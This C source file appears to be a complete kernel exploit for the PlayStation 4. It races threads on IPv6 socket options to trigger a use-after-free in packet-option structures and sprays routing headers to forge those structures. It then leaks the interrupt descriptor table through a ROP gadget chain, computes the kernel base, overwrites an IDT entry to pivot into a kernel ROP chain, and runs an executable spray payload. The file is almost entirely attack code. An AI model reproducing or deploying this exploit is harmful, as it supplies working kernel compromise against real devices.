#include <sys/types.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/cpuset.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet6/ip6_var.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/mman.h>
#include <printf/printf.h>
#include <librop/pthread_create.h>
#include <ps4/errno.h>

#define new_socket() socket(AF_INET6, SOCK_DGRAM, 0)

#define IPV6_2292PKTINFO 19
#define IPV6_2292PKTOPTIONS 25

// ps4-rop-8cc generates thread-unsafe code, so each racing thread needs its own get_tclass function
#define GET_TCLASS(name) int name(int s)\
{\
    int v;\
    socklen_t l = sizeof(v);\
    if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l))\
        *(volatile int*)0;\
    return v;\
}

GET_TCLASS(get_tclass)
GET_TCLASS(get_tclass_2)
GET_TCLASS(get_tclass_3)

int set_tclass(int s, int val)
{
    if(setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
        *(volatile int*)0;
}

#define TCLASS_MASTER 0x13370000
#define TCLASS_MASTER_2 0x73310000
#define TCLASS_SPRAY 0x41
#define TCLASS_TAINT 0x42

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s) set_pktopts(s, NULL, 0)

int get_rthdr(int s, char* buf, int len)
{
    socklen_t l = len;
    if(getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
        *(volatile int*)0;
    return l;
}

#define set_pktinfo(s, buf) setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))

int get_pktinfo(int s, char* buf)
{
    socklen_t l = sizeof(struct in6_pktinfo);
    if(getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
        *(volatile int*)0;
    return l;
}

struct opaque
{
    volatile int triggered;
    volatile int padding;
    volatile int done1;
    volatile int done2;
    int master_sock;
    int kevent_sock;
    int* spray_sock;
};

void* use_thread(void* arg)
{
    struct opaque* o = (struct opaque*)arg;
    char buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr* cmsg = (struct cmsghdr*)buf;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    cmsg->cmsg_level = IPPROTO_IPV6;
    cmsg->cmsg_type = IPV6_TCLASS;
    *(int*)CMSG_DATA(cmsg) = 0;
    while(!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
        if(set_pktopts(o->master_sock, buf, sizeof(buf)))
            *(volatile int*)0;
    o->triggered = 1;
    o->done1 = 1;
}

void* free_thread(void* arg)
{
    struct opaque* o = (struct opaque*)arg;
    while(!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY)
    {
        if(free_pktopts(o->master_sock))
            *(volatile int*)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    o->triggered = 1;
    o->done2 = 1;
}

void trigger_uaf(struct opaque* o)
{
    o->triggered = o->padding = o->done1 = o->done2 = 0;
    int qqq[256];
    pthread_create(qqq, NULL, use_thread, o);
    pthread_create(qqq+128, NULL, free_thread, o);
    for(;;)
    {
        for(int i = 0; i < 32; i++)
            set_tclass(o->spray_sock[i], TCLASS_SPRAY);
        if(get_tclass(o->master_sock) == TCLASS_SPRAY)
            break;
        for(int i = 0; i < 32; i++)
            if(free_pktopts(o->spray_sock[i]))
                *(volatile int*)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    printf("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
    o->triggered = 1;
    while(!o->done1 || !o->done2);
}

int build_rthdr_msg(char* buf, int size)
{
    int len = ((size / 8) - 1) & ~1;
    size = (len + 1) * 8;
    struct ip6_rthdr* rthdr = (struct ip6_rthdr*)buf;
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
    return size;
}

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))

int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo)
{
    free_pktopts(overlap_sock);
    char buf[0x100] = {0};
    int l = build_rthdr_msg(buf, 0x100);
    int tclass;
    for(;;)
    {
        for(int i = 0; i < 32; i++)
        {
            *(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
            *(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
            if(set_rthdr(o->spray_sock[i], buf, l))
                *(volatile int*)0;
        }
        tclass = get_tclass(o->master_sock);
        if((tclass & 0xffff0000) == tclass0)
            break;
        for(int i = 0; i < 32; i++)
            if(set_rthdr(o->spray_sock[i], NULL, 0))
                *(volatile int*)0;
    }
    return tclass & 0xffff;
}

unsigned long long __builtin_gadget_addr(const char*);
unsigned long long rop_call_funcptr(void(*)(void*), ...);

void sidt(unsigned long long* addr, unsigned short* size)
{
    char buf[10];
    unsigned long long ropchain[14] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        ropchain+13,
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rsi"),
        ~7ull,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        0x7d,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("sidt [rax - 0x7d]"),
        __builtin_gadget_addr("pop rsp"),
        0
    };
    ((void(*)(char*))ropchain)(buf);
    *size = *(unsigned short*)buf;
    *addr = *(unsigned long long*)(buf+2);
}

void (*enter_krop)(void);
extern uint64_t krop_idt_base;
extern uint64_t krop_jmp_crash;
extern uint64_t krop_ud1;
extern uint64_t krop_ud2;
extern uint64_t krop_read_cr0;
extern uint64_t krop_read_cr0_2;
extern uint64_t krop_write_cr0;
extern uint64_t krop_c3bak1;
extern uint64_t krop_c3bak2;
extern uint64_t krop_kernel_base;
extern uint64_t krop_master_sock;
extern char spray_bin[];
extern char spray_end[];

struct spray_opaque
{
    int cpu;
    void* spray_map;
    uint64_t kernel_base;
    int* flag;
};

void pin_to_cpu(int cpu)
{
    cpuset_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
}

int main()
{
    if(!setuid(0))
        return 179;
    for(int i = 0; i < 16; i++)
        new_socket();
    int tmp;
    uint64_t idt_base;
    uint16_t idt_size;
    sidt(&idt_base, &idt_size);
    printf("sidt = 0x%hx 0x%llx\n", idt_size, idt_base);
    krop_idt_base = idt_base;
    uint64_t kernel_base = idt_base - 0x1bbb9e0;
    krop_kernel_base = kernel_base;
    krop_jmp_crash = kernel_base + 0x1c0;
    krop_read_cr0 = kernel_base + 0xa1b70;
    krop_read_cr0_2 = kernel_base + 0xa1b70;
    krop_write_cr0 = kernel_base + 0xa1b79;
    int kevent_sock = new_socket();
    int master_sock = new_socket();
    krop_master_sock = master_sock * 8;
    int spray_sock[512];
    int q1 = 0, q2 = 0;
    for(int i = 0; i < 512; i++)
        q1 += (spray_sock[i] = new_socket());
    printf("sockets=%d kqueues=%d\n", q1, q2);
    struct opaque o = {.master_sock = master_sock, .kevent_sock = kevent_sock, .spray_sock = spray_sock};
    trigger_uaf(&o);
    printf("uaf ok!\n");
    set_tclass(master_sock, TCLASS_TAINT);
    int overlap_idx = -1;
    for(int i = 0; i < 512; i++)
        if(get_tclass(spray_sock[i]) == TCLASS_TAINT)
            overlap_idx = i;
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    int overlap_sock = spray_sock[overlap_idx];
    int cleanup1 = overlap_sock;
    spray_sock[overlap_idx] = new_socket();
    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    overlap_sock = spray_sock[overlap_idx];
    int cleanup2 = overlap_sock;
    spray_sock[overlap_idx] = new_socket();
    char buf[20];
    printf("get_pktinfo() = %d\n", get_pktinfo(master_sock, buf));
    printf("idt before corruption: ");
    for(int i = 0; i < 20; i++)
        printf("%02x ", (unsigned)(unsigned char)buf[i]);
    printf("\n");
    char buf2[20];
    for(int i = 0; i < 20; i++)
        buf2[i] = buf[i];
    uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
    krop_c3bak1 = *(uint64_t*)(buf2 + 4);
    krop_c3bak2 = *(uint64_t*)(buf2 + 12);
    *(uint16_t*)(buf2 + 4) = (uint16_t)entry_gadget;
    *(uint64_t*)(buf2 + 10) = entry_gadget >> 16;
    buf2[9] = 0x8e;
    krop_ud1 = *(uint64_t*)(buf2 + 4);
    krop_ud2 = *(uint64_t*)(buf2 + 12);
    buf2[9] = 0xee;
    printf("idt after corruption:  ");
    for(int i = 0; i < 20; i++)
        printf("%02x ", (unsigned)(unsigned char)buf2[i]);
    printf("\n");
    printf("set_pktinfo() = %d\n", set_pktinfo(master_sock, buf2));
    enter_krop();
    char* spray_start = spray_bin;
    char* spray_stop = spray_end;
    char* spray_map = mmap(0, spray_stop-spray_start, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
    printf("spray_map = 0x%llx\n", spray_map);
    for(size_t i = 0; i < spray_stop - spray_start; i++)
        spray_map[i] = spray_start[i];
    //run malloc sprays to reclaim any potential double frees
    pin_to_cpu(6);
    rop_call_funcptr(spray_map, spray_sock, kernel_base);
    pin_to_cpu(7);
    rop_call_funcptr(spray_map, NULL, kernel_base);
    return 0;
}
